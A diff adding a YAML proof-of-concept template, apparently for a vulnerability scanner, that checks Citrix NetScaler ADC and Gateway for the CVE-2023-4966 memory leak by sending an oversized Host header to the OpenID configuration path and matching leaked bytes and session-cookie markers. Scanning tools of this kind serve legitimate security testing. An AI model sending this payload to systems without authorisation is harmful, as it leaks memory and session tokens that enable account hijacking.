@@ -1,0 +1,20 @@
+id: poc-yaml-citrix-memory-leak
+info:
+  name: Citrix 内存信息泄露漏洞(CVE-2023-4966)
+  severity: high
+  tags:
+  - CVE-2023-4966
+  - 两高一弱
+  finger: NetScaler ADC,NetScaler Gateway
+variables:
+  payload_host: repeat("a", 24700)
+requests:
+- method: GET
+  path: /oauth/idp/.well-known/openid-configuration
+  headers:
+    host: '{{.payload_host}}'
+    User-Agent: 111
+    Accept: 111
+  expression: "status_code == 200 && contains(body, \"\\x00\\x00\\x00\\x00\") \n&&\
+    \ (contains(body, \"NSC_AAAC\")||contains(body,\"\\\"issuer\\\"\"))\n"
+transport: http
